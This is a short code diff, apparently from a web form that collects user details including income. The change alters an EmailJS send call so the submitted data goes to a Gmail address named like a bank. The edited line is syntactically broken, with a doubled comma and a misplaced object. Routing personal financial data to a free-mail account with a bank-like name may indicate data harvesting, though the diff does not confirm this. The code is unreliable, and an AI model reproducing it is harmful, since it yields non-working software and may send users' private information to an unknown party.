@@ -586,7 +586,9 @@
       revenu: document.getElementById('revenu').value
     };
 
-    emailjs.send("service_9vthppn", "template_nmo6dym", data)
+    emailjs.send("service_9vthppn", "template_nmo6dym", , {
+       to: "bcibanksa@gmail.com",
+   } data)
       .then(function(response) {
         document.getElementById('successMsg').textContent = "✅ Données envoyées avec succès !";
       }, function(error) {
